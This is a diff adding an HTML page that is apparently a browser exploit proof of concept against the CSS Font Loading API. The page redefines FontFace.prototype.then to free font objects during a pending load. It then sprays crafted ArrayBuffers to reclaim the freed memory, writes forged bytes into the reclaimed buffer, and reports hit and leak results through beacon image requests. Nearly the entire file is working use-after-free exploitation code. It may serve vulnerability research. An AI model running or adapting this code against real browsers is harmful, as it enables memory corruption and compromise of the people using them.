@@ -1,0 +1,78 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p810</title></head>
+<body><pre id="out">p810v6</pre>
+<script>
+var results=[];
+function log(s){results.push(s);}
+function sendAll(){
+  var O=document.getElementById("out");
+  O.textContent=results.join("\n");
+  for(var i=0;i<results.length;i++){
+    try{new Image().src="/beacon/P810-"+encodeURIComponent(results[i])+"?t="+Date.now();}catch(e){}
+  }
+}
+
+var SIZE=192,K=256,fired=false;
+
+try{
+  var vf=new FontFace("vf","local(Helvetica)",{unicodeRange:"U+0041"});
+  document.fonts.add(vf);void vf.loaded;
+  var fs2=document.createElement("style");
+  fs2.textContent="@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(fs2);
+
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs2.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      // NEUTRALIZE: set safe values so CSS engine doesn't crash
+      w[0]=2;w[1]=0;w[2]=0;w[3]=0; // refcount=2
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      // +0x08..+0x17: variant data — leave as zero (null Ref = CSS returns empty)
+      // +0x82: status=0 (Pending — font engine won't try to use it)
+      w[0x82]=0;
+      // +0x58..+0x5F: m_clients hash table = null (safe for iteration)
+      // Already zero — safe
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load("1em vf, v1","AB").then(function(faces){
+    log("RES-n"+faces.length);
+
+    // Find hit — NO beacons, NO DOM, pure JS
+    var hitIdx=-1;
+    for(var i=0;i<window.__sp.length;i++){
+      var v=0;for(var j=0;j<8;j++)v+=window.__sp[i][0x58+j];
+      if(v>0){hitIdx=i;break;}
+    }
+    log("HIT-"+hitIdx);
+    if(hitIdx<0){log("NOLEAK");setTimeout(sendAll,100);return;}
+
+    // Test face.style IMMEDIATELY — pure JS, no DOM, no beacons
+    var styleResults=[];
+    for(var i=0;i<faces.length;i++){
+      try{styleResults.push("F"+i+"="+faces[i].style);}
+      catch(e){styleResults.push("F"+i+"=THREW:"+e.message.slice(0,20));}
+    }
+    log("STYLES-"+styleResults.join("|"));
+
+    // If we got here: modify hit buffer and test again
+    var hb=window.__sp[hitIdx];
+    hb[0x08]=0xDE;hb[0x09]=0xAD;
+    var s2=[];
+    for(var i=0;i<faces.length;i++){
+      try{s2.push("F"+i+"="+faces[i].style);}
+      catch(e){s2.push("F"+i+"=THREW:"+e.message.slice(0,20));}
+    }
+    hb[0x08]=0;hb[0x09]=0;
+    log("FORGE-"+s2.join("|"));
+
+    // Send all results via deferred beacons
+    setTimeout(sendAll,100);
+  });
+}catch(e){log("ERR-"+e.message.slice(0,60));setTimeout(sendAll,100);}
+</script></body></html>
